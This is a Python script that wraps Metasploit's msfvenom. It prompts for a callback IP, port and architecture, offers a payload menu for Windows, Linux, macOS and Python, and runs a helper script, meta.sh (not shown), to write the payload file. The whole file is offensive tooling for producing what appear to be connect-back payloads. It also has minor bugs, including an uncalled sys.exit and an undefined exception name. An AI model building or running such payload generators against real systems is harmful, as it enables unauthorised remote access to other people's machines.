#!/usr/bin/python3

import subprocess
import re
import os
from time import sleep
import sys

BLACK = "\033[1;30m"
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
MAGENTA = "\033[1;35m"
CYAN = "\033[1;36m"
WHITE = "\033[1;37m"
regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"


def menu():
	print(f"\n\n\t\t {MAGENTA}PAYLOAD MENU\n\n")
	print(f"{GREEN}1) Windows")
	print(f"{GREEN}2) Linux(x86/x64)")
	print(f"{GREEN}3) MAC OS")
	print(f"{GREEN}4) Python Script\n\n")


def main(IP, PORT, ARCH):
	if pre_requisite() == False:
		print(f"{RED}\n\n[-] Metasploit is not installed.")
		sleep(4)
		sys.exit
	else:
		menu()
		result = "-"
		try:
			OP = input(f"{GREEN}Enter option number: ")
			print(f"\n{WHITE}[+] Please wait for few minutes...\n")
			result = subprocess.call(["./meta.sh", f"{IP}", f"{PORT}", f"{OP}", f"{ARCH}"])
			if not result:
				print(f"\n{GREEN}[+] Successful\n[+] File saved in {os.getcwd()}\n")
			else:
				print(f"{RED}[-] Error!")
		except EXCEPTION:
			print(f"{RED}Invalid Input!")


def check(IP):
    if(re.search(regex, IP)):
        return 1
    else:
        return 0


def pre_requisite():
	from shutil import which
	return which("msfvenom") is not None


while True:
	print(f"\n\t{BLUE}Available Options\n")
	IP = input(f"{RED}Enter IP: ")
	try:
		PORT = int(input(f"{RED}Enter PORT: "))
	except:
		PORT = 1234
		print(f"{RED}\n[-] Invalid PORT\n{GREEN}[+] Selecting Default PORT=1234\n")
	if check(IP) == 1 and PORT < 65355:
		break
	else:
		print(f"\n\n{RED}[-] Invalid IP\n\n[-] Please wait...")
		sleep(2)
		os.system('clear')

print(f"{GREEN}\n1) x64\n2) x86\n")
# Architecture Default (x86)
ARCH = input(f"{RED}Architecture (Default -> x86): ")
if not ARCH:
	ARCH=2

main(IP, PORT, ARCH)
